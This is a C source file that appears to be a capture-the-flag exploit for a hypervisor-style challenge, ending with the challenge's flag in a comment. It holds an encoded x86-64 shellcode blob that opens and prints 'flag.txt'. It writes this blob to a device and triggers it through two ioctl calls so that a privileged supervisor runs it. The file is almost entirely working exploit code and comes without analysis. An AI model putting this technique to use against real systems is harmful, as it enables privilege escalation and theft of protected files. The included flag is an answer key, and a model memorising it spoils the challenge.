
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

const char *shellcode = "\x48\x31\xd2\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05";
const size_t shellcode_len = 47;

int main(int argc, char ** argv) {
    printf("Hello World!\n");

    int fd = open("/dev/exploited-device", O_RDWR);
    if(fd == -1) {
        perror("open");
        exit(1);
    }

    ssize_t res = write(fd, shellcode, shellcode_len);
    if(res != shellcode_len) {
        printf("write error. Written: %ld\n", res);
        exit(1);
    }
    res = ioctl(fd, 0xdead); //write shellcode to supervisor
    if (res<0) {
        perror("ioctl1");
        exit(1);
    }
    res = ioctl(fd, 0xbeef); //invoke shellcode
    if (res<0) {
        perror("ioctl2");
        exit(1);
    }

    return 0;
}

//dice{dicer-visor-rules}
